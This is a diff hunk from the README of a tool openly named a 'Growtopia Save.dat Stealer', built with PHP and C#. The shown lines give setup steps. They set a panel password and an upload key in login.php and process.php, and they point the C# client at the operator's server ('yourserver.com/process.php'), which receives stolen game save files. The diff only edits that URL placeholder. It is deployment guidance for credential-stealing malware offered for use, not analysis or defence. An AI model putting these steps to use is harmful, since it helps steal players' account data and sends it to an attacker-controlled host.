@@ -15,7 +15,7 @@ Growtopia Save.dat Stealer built with php and C#
 2.1. Open "login.php" with text editor. Find and replace "pakyubobo" with desired password.  
 2.2. Open "process.php" with text editor. Find and replace "pakyubobo" with desired code. This will act as upload key to prevent upload attack, maybe?
 3. Client:  
-3.1. Open the project solution. Find and replace "yourserver.com" with your server.  
+3.1. Open the project solution. Find and replace "yourserver.com/process.php" with your server.  
 3.2. Aslo find and replace the said code "pakyubobo" with desired code.
 
 # Credits
